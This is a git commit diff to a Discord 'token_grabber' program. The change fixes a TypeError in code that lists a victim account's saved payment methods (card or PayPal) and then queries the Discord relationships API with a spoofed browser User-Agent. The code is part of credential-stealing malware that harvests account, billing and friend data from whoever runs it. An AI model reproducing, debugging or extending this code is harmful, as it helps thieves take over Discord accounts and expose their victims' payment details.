2fcd6d7657abaa76f00fb7a18dfbfa36ed6d8aea
addi00000 <addison@othius.com>
2022-06-10 21:16:47 -0400

    #1 | Fixed: File "built.py", line 126, in embed_accounts; TypeError: string indices must be integers

--- main.py
+++ main.py
@@ -123,16 +123,16 @@ class token_grabber():
                 methods = "`None`"
             else:
                 methods = ""
-                for method in b.json():
-                    try:
+                try:
+                    for method in b.json():
                         if method['type'] == 1:
                             methods += "💳"
                         elif method['type'] == 0:
                             methods += "<:paypal:973417655627288666>"
                         else:
                             methods += "❓"
-                    except TypeError:
-                        methods += "❓"
+                except TypeError:
+                    methods += "❓"
                         
             f = requests.get("https://discordapp.com/api/v6/users/@me/relationships", headers={
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
